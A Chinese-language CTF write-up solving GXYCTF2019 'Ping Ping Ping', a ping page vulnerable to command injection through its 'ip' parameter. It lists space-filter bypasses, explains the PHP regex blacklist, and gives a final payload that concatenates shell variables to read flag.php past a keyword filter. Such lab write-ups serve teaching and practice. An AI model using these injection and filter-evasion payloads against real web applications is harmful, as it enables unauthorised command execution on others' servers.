# [GXYCTF2019]Ping Ping Ping


# [GXYCTF2019]Ping Ping Ping

初次访问：

![[GXYCTF2019]Ping Ping Ping-1](https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg)

根据页面的提示`/?ip=`以及题目`Ping Ping Ping`可以猜测PING的IP可以通过GET型给参数`ip`传参

尝试输入`?ip=8.8.8.8`，页面回显`ping 8.8.8.8`的内容，说明猜测是正确的

![[GXYCTF2019]Ping Ping Ping-2](https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg)

试试是否存在RCE漏洞，输入`?ip=8.8.8.8;ls`，发现执行了`ls`，说明存在RCE漏洞

![[GXYCTF2019]Ping Ping Ping-3](https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg)

想查看`flag.php`里的内容，输入`?ip=8.8.8.8;cat flag.php`，并没有得到预期的结果，发现其存在过滤机制，具体是什么机制还是未知，目前已知过滤空格

![[GXYCTF2019]Ping Ping Ping-4](https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg)

> **空格的替代方式**
>
> - `$IFS$9`=>`cat$IFS$9flag.php`
> - `${ IFS}`=>`cat${ IFS}flag.php`
> - `${IFS}`=>`cat${IFS}flag.php`
> - `%09`=>`cat%09flag.php`
> - `<`=>`cat>flag.php`
> - `>`=>`cat<flag.php`
> - `<>`=>`cat<>flag.php`
> - `{,}`=>`{cat,flag.php}`
> - `%20`(URL编码)

想办法绕过空格过滤，绕过空格过滤的方法有很多，一个个试，输入`?ip=8.8.8.8;cat${IFS}flag.php`，发现不是提示space而是symbol，说明除了空格还过滤了其他的符号

![[GXYCTF2019]Ping Ping Ping-5](https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg)

直到输入`?ip=8.8.8.8;cat$IFS$9flag.php`，发现不提示space、symbol，而是flag，说明连flag都过滤了

![[GXYCTF2019]Ping Ping Ping-6](https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg)

这时候就该蒙圈了，由于几乎不清楚过滤机制的逻辑，稳妥做法是先绕过空格过滤，然后查看`index.php`的源码

输入`?ip=8.8.8.8;cat$IFS$9index.php`，查看到`index,php`里的源码

![[GXYCTF2019]Ping Ping Ping-7](https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg)

但怎么觉得这源码好像缺斤少两的，通过查看网页源代码获取到完整源码

![[GXYCTF2019]Ping Ping Ping-8](https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg)

重点看涉及到过滤机制的代码：

```php
if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
```

先看第一个判断：

```php
if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
```

`preg_match()`是一个通过正则来匹配字符串的函数，匹配成功返回1、失败返回0，即true or false

格式大致为`preg_match(["/正则规则/"],["接受匹配的字符串"],[用于存储匹配结果的数组])`

(用于存储匹配结果的数组可有可无)

可以这么理解，如果"接受匹配的字符串"符合"/正则规则/"，则返回个1，反之0

再来看正则部分，正则规则被包含在两个`/`内

正则的内容是：`\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}`

`[\x{00}-\x{1f}]`的意思是将匹配字符串中包含 Unicode 编码范围从 00 到 1F 的所有字符。

整条正则的意思是只要`$ip`里有`&` `/` `?` `*` `<` `>` `'` `"` `\` `(` `)` `[` `]` `{` `}` 以及 Unicode 编码范围从 00 到 1F 的所有字符如回车、换行等的字符就匹配成功

再看第二个判断：

```php
else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  }
```

正则的内容是一个空格，意思是只要`$ip`里有空格就匹配成功

再看第三个判断：

```php
else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  }
```

正则的内容是`bash`，意思是只要`$ip`里出现`bash`就匹配成功

再看第四个判断：

```php
else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
```

正则的内容是`.*f.*l.*a.*g.*`，意思是只要`$ip`里依次出现`f` `l` `a` `g`就匹配成功，例如字符串：`1f2l3a4g5`就可以匹配成功

知道了过滤机制接下来就要去绕过，原始payload是`?ip=8.8.8.8;cat flag.php`，需要绕过的有：空格、flag

首先空格可以用`$IFS$9`代替

由于`$`和`;`没有被过滤，所以可以用变量拼接来绕过正则`.*f.*l.*a.*g.*`，例如：`a=ag;b=fl`，这样`flag`就变成`$b$a`

**最终的payload是：`?ip=8.8.8.8;a=ag;b=fl;cat$IFS$9$b$a.php`**

![[GXYCTF2019]Ping Ping Ping-9](https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg)

查看页面源码，得到flag

![[GXYCTF2019]Ping Ping Ping-10](https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg)

​	

​	

**参考文章**

- [preg_match()函数](https://www.php.net/manual/zh/function.preg-match.php)
- [命令执行(RCE)面对各种过滤](https://zhuanlan.zhihu.com/p/391439312)

